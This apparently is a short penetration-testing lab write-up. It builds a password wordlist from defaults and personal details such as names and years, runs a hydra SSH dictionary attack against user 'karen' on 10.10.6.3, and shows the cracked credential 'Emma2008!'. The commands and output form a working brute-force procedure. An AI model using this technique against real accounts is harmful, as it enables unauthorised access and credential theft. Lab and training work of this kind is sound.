## Password Dictionary

File:

```text
passwords.txt
```

Content:

```text
password
admin
root
karen
Welcome1
Password123
Emma2008!
Emma
Jean
2008
1998
Jean1998/
```

Verification:

```bash
cat passwords.txt
```

---

## Attack Execution

Hydra SSH dictionary attack:

```bash
hydra -l karen -P passwords.txt ssh://10.10.6.3
```

Result:

```text
[22][ssh] host: 10.10.6.3
login: karen
password: Emma2008!
```

Hydra successfully identified a valid credential for the target account.

